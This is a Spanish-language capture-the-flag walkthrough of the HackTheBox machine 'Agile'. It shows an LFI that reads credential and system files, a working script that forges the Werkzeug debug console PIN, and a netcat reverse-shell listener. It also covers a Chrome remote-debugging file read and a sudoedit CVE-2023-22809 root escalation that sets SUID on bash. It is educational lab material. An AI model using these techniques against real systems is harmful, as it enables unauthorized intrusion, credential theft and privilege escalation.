---
tags:
title: Agile - Medium (HTB)
permalink: /Agile-HTB-Writeup
toc_label: Topics
toc: true
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
 nmap -sCV -p22,80 10.129.228.212                                                                                                                            
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-01 00:06 -0500
Nmap scan report for superpass.htb (10.129.228.212)
Host is up (0.52s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SuperPassword \xF0\x9F\xA6\xB8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.43 seconds

```

## Website 

La pagina principal no muestra mucho.

![image-center](/assets/images/Pasted image 20260101020650.png)
### Login

Me registre e inicie sesion.

![image-center](/assets/images/Pasted image 20260101020816.png)
### Feroxbuster enumeration

El escaneo no revelo, mucho, solo una ruta `/download` a la cual voy a volver mas adelante.

```bash
 feroxbuster -u http://superpass.htb
<SNIP>
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      249c http://superpass.htb/download => http://superpass.htb/account/login?next=%2Fdownload
200      GET      146l      229w     1946c http://superpass.htb/static/css/site.css
200      GET        6l       13w      153c http://superpass.htb/static/css/josefinsans.css
200      GET       73l      154w     3082c http://superpass.htb/account/login
302      GET        5l       22w      243c http://superpass.htb/vault => http://superpass.htb/account/login?next=%2Fvault
200      GET      103l      611w    41388c http://superpass.htb/static/img/SP.png
200      GET        5l      363w    20337c http://superpass.htb/static/js/popper.min.js
200      GET      146l      548w    40203c http://superpass.htb/static/img/agile.png
200      GET        7l      579w    51039c http://superpass.htb/static/js/bootstrap.min.js
200      GET      115l      628w    49755c http://superpass.htb/static/img/convenient.png
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l     1044w    69917c http://superpass.htb/static/js/jquery-3.3.1.slim.min.js
301      GET        7l       12w      178c http://superpass.htb/static => http://superpass.htb/static/
200      GET        1l      842w    40334c http://superpass.htb/static/js/htmx.min.js
200      GET        6l      151w   101894c http://superpass.htb/static/css/all.min.css
200      GET      343l     2088w   156865c http://superpass.htb/static/img/random.png
200      GET      277l     1488w   126558c http://superpass.htb/static/img/army.png
403      GET        7l       10w      162c http://superpass.htb/static/img/
403      GET        7l       10w      162c http://superpass.htb/static/
301      GET        7l       12w      178c http://superpass.htb/static/js => http://superpass.htb/static/js/
301      GET        7l       12w      178c http://superpass.htb/static/css => http://superpass.htb/static/css/
200      GET        1l     2069w    96422c http://superpass.htb/static/js/_hyperscript.min.js
403      GET        7l       10w      162c http://superpass.htb/static/css/
301      GET        7l       12w      178c http://superpass.htb/static/img => http://superpass.htb/static/img/
403      GET        7l       10w      162c http://superpass.htb/static/js/
200      GET        7l     1667w   140936c http://superpass.htb/static/css/bootstrap.min.css
200      GET      589l     3498w   384425c http://superpass.htb/static/img/rocket.png
200      GET      846l     3944w   493569c http://superpass.htb/static/img/lock.jpg
200      GET     2548l    14419w  1288572c http://superpass.htb/static/img/hero.png
200      GET      131l      307w     6128c http://superpass.htb/
[####################] - 4m    150026/150026  0s      found:29      errors:1      
[####################] - 4m     30000/30000   128/s   http://superpass.htb/ 
[####################] - 4m     30000/30000   142/s   http://superpass.htb/static/css/ 
[####################] - 4m     30000/30000   142/s   http://superpass.htb/static/img/ 
[####################] - 4m     30000/30000   142/s   http://superpass.htb/static/ 
[####################] - 4m     30000/30000   142/s   http://superpass.htb/static/js/ 
```
### LFI
Dentro de la pagina, veo un apartado, donde puedo crear claves para una pagina y usuario determinado.

![image-center](/assets/images/Pasted image 20260101022435.png)

Interceptando la petici칩n al hacer click en `Export`, veo que se devuelve el contenido de un archivo.

![image-center](/assets/images/Pasted image 20260101022419.png)
## Shell as www-data

Probando una simple inyecci칩n para un `LFI` logre ver el contenido del `/etc/passwd`.

![image-center](/assets/images/Pasted image 20260101022507.png)

### Environ

Viendo el contenido de `/proc/self/environ` veo que la pagina se corre como el usuario `www-data`.

![image-center](/assets/images/Pasted image 20260101022817.png)
### MySQL credentials

Y adem치s un archivo de configuracion, con claves de conexion a una base de datos de `MySQL`.

![image-center](/assets/images/Pasted image 20260101022906.png)

A estas mismas voy a volver mas adelante.

```sql
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```
### Werzeug PIN

Yendo a la ruta `/download` me sale una pagina de error, donde si paso el cursos sobre cualquiera de los mensaje me sale un icono de una terminal, haciendo click en el mismo para poder ejecutar comandos, me sale la siguiente ventana que indica que esta protegida con un PIN.

![image-center](/assets/images/Pasted image 20260101023514.png)
### Craft PIN

Para poder obtener el mismo segui la gu칤a de este [repositorio](https://github.com/wdahlenburg/werkzeug-debug-console-bypass), el cual usando el propio `LFI` puedo obtener todos los datos.

El path de la aplicacion lo obtengo de la pagina de error.

![image-center](/assets/images/Pasted image 20260102003500.png)
### Private bits

Luego para obtener los `Private Bits`, necesito primero la direcci칩n `MAC` la cual obtengo del siguiente archivo :
`/sys/class/net/eth0/address`, lo que me devuelve : `00:50:56:95:e9:b6` que para eliminar los doble punto use la misma consola interactiva de `python3`

```bash
>>> mac = '00:50:56:95:e9:b6'
>>> int(replace(":", ""), 16)
Traceback (most recent call last):
  File "<python-input-5>", line 1, in <module>
    int(replace(":", ""), 16)
        ^^^^^^^
NameError: name 'replace' is not defined
>>> int(mac.replace(":", ""), 16)
345050048950
```

Y luego el `appname` que como indica [ac치](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html) , generalmente resuelve a `Flask`, o `wsgi_app`, de todas formas esto lo puedo averiguar viendo el contenido del `app.py`.

![image-center](/assets/images/Pasted image 20260102004243.png)
### Script

De manera que mi script queda as칤:

```python
cat w.py 
#!/bin/python3
import hashlib
from itertools import chain
probably_public_bits = [
 'www-data',# username
 'flask.app',# modname
 'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
 '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]
private_bits = [
 '345050048950',
 # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
 'ed5b159560f54721827644bc9b220d00superpass.service'
]
h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
 if not bit:
  continue
 if isinstance(bit, str):
  bit = bit.encode('utf-8')
 h.update(bit)
h.update(b'cookiesalt')
cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
 h.update(b'pinsalt')
 num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv = None
if rv is None:
 for group_size in 5, 4, 3:
  if len(num) % group_size == 0:
   rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
        for x in range(0, len(num), group_size))
   break
 else:
  rv = num
print("Pin: " + rv)

```

Ejecut치ndolo obtengo el `PIN`.

```bash
 python3 w.py
Pin: 103-474-522
```

Coloc치ndolo, es correcto, as칤 que me envi칠 una `shell` con el siguiente comando.

![image-center](/assets/images/Pasted image 20260101034005.png)

Y desde mi listener recibo la conexi칩n.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.228.212] 44396
(venv) www-data@agile:/app/app$ whoami 
whoami
www-data
(venv) www-data@agile:/app/app$
```
## Shell as corum

Con las credenciales que obtuve antes, me conecte a la base de datos, listando `dbs`, `tablas` y el contenido de las mismas.

```bash
 www-data@agile:/app/app/superpass/data$ mysql -u superpassuser -p
mysql -u superpassuser -p
Enter password: dSA6l7q*yIVs$39Ml6ywvgK
<SNIP>

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+
3 rows in set (0.00 sec)

mysql> use superpass
<SNIP>
mysql> show tables;
show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)
```

Y listando el contenido de una de las dos, veo la password del usuario `corum`.

```bash
mysql> select * from passwords;
select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
```
### SSH

Probandola me habilita el login para `ssh`.

```bash
ssh corum@superpass.htb    
corum@superpass.htb's password: 

corum@agile:~$ cat user.txt 
357c7562d13cbc008cdcc59a30b621dc
```
## Shell as edwards

Uno de los archivos en `/app-testing`es `creds.txt` el cual corum no tiene acceso, donde el contenido del mismo es usando en este script para conectarse al servicio que corre en `test.superpass.htb`.

```bash
corum@agile:/app/app-testing/tests/functional$ cat test_site_interactively.py 
import os
import pytest
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait


with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
    username, password = f.read().strip().split(':')
    
    
@pytest.fixture(scope="session")
def driver():
    options = Options()
    #options.add_argument("--no-sandbox")
    options.add_argument("--window-size=1420,1080")
    options.add_argument("--headless")
    options.add_argument("--remote-debugging-port=41829")
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)
    yield driver
    driver.close()


def test_login(driver):
    print("starting test_login")
    driver.get('http://test.superpass.htb/account/login')
    time.sleep(1)
    username_input = driver.find_element(By.NAME, "username")
    username_input.send_keys(username)
    password_input = driver.find_element(By.NAME, "password")
    password_input.send_keys(password)
    driver.find_element(By.NAME, "submit").click()
    time.sleep(3)
    title = driver.find_element(By.TAG_NAME, "h1")
    assert title.text == "Welcome to your vault"


def test_add_password(driver):
    print("starting test_add_password")
    driver.find_element(By.NAME, "add_password").click()
    time.sleep(3)
    site = driver.find_element(By.NAME, "url")
    site.send_keys("test_site")
    username = driver.find_element(By.NAME, "username")
    username.send_keys("test_user")
    driver.find_element(By.CLASS_NAME, "fa-save").click()
    time.sleep(3)

    assert 'test_site' in driver.page_source
    assert 'test_user' in driver.page_source


def test_del_password(driver):
    print("starting test_del_password")
    password_rows = driver.find_elements(By.CLASS_NAME, "password-row")

    for row in password_rows:
        if "test_site" == row.find_elements(By.TAG_NAME, "td")[1].text and \
            "test_user" == row.find_elements(By.TAG_NAME, "td")[2].text:
            row.find_element(By.CLASS_NAME, "fa-trash").click()

    time.sleep(3)
    assert 'test_site' not in driver.page_source
    assert 'test_user' not in driver.page_source


def test_title(driver):
    print("starting test_title")
    driver.get('http://test.superpass.htb')
    time.sleep(3)
    assert "SuperPassword 游붲" == driver.title


def test_long_running(driver):
    print("starting test_long_running")
    driver.get('http://test.superpass.htb')
    time.sleep(550)
    #time.sleep(5)
    assert "SuperPasword 游붲" == driver.title

```
### Port Forwarding

Como veo que el puerto `5555` esta abierto localmente.

```bash
corum@agile:$ netstat -tnlp | grep 5555
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -  
```

Me lo traje a mi maquina.

```bash
root@kali:~$ ssh -L 5555:127.0.0.1:5555 corum@superpass.htb
```

Sin embargo muestra el mismo contenido de la misma.

### Chrome debug

En el puerto `41289` esta corriendo el debugger de `Chrome`.

Donde para ver el contenido del `confi_test.json` use el protocolo `file`
![image-center](/assets/images/Pasted image 20260102010110.png)

Yendo al link que me provee el propio `devtools` me salen el contenido de dicho archivo, junto con unas credenciales de conexi칩n para una base de datos, distintas a las credenciales que obtuve antes.

![image-center](/assets/images/Pasted image 20260102010336.png)

Realice la conexion, listando las dbs, y listando el contenido de la tabla `passwords` para obtener la password del usuario `edwards`.

```bash
corum@agile:~$ mysql -u superpasstester -p
Enter password: 
<SNIP>
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpasstest      |
+--------------------+
3 rows in set (0.00 sec)

mysql> use superpasstest
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------+
| Tables_in_superpasstest |
+-------------------------+
| passwords               |
| users                   |
+-------------------------+
2 rows in set (0.00 sec)

mysql> select * from passwords;
+----+---------------------+---------------------+---------+------------+----------------------+---------+
| id | created_date        | last_updated_data   | url     | username   | password             | user_id |
+----+---------------------+---------------------+---------+------------+----------------------+---------+
|  1 | 2023-01-25 01:10:54 | 2023-01-25 01:10:54 | agile   | edwards    | d07867c6267dcb5df0af |       1 |
|  2 | 2023-01-25 01:14:17 | 2023-01-25 01:14:17 | twitter | dedwards__ | 7dbfe676b6b564ce5718 |       1 |
+----+---------------------+---------------------+---------+------------+----------------------+---------+
2 rows in set (0.00 sec)
```

Migro a dicho usuario.

```bash
corum@agile:~$ su edwards
Password: 
edwards@agile:/home/corum$ 
```
## Shell as root

```bash
edwards@agile:/home/corum$ sudo -l
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

```bash
edwards@agile:/home/corum$ /usr/bin/sudo --version
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

La versi칩n sudo es anterior a `1.9.12p2`, por lo que `sudoedit` es vulnerable a `CVE-2023-22809`. Para explotar esta vulnerabilidad, necesito un archivo que el `dev_admin` puede crear, y `root` puede ejecutar.

As칤 que corr칤 `pspy64` para encontrar alg칰n proceso con estas caracter칤sticas y q corran como `root`.

```bash
edwards@agile:/$ ls -l /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin 1976 Aug  9 10:24 /app/venv/bin/activate
```

### Exploit cve

```bash
edwards@agile:/tmp$ export EDITOR="vim -- /app/venv/bin/activate"
edwards@agile:/tmp$ sudo -u dev_admin sudoedit /app/config_test.json
```

Y en esta interfaz le asigno el bit `SUID` a la `bash`, y luego para guardar lo cambios toque: `Shift + : + wq!`.

![image-center](/assets/images/Pasted image 20260102011451.png)
### Shell

Y viendo los permisos, se asignaron correctamente.

```bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Por lo que puedo ejecutar `bash -p` para obtener los privilegios de `root`.

```bash
edwards@agile:/tmp$ bash -p
edwards@agile:/tmp# /bin/bash -p
edwards@agile:/tmp# id
uid=1002(edwards) gid=1002(edwards) euid=0(root) groups=1002(edwards)
```

Y ya veo la flag

```bash
edwards@agile:/tmp# cat /root/root.txt 
78e6dc39050572b1ca73a6574d277c4e
```

`~Happy Hacking.`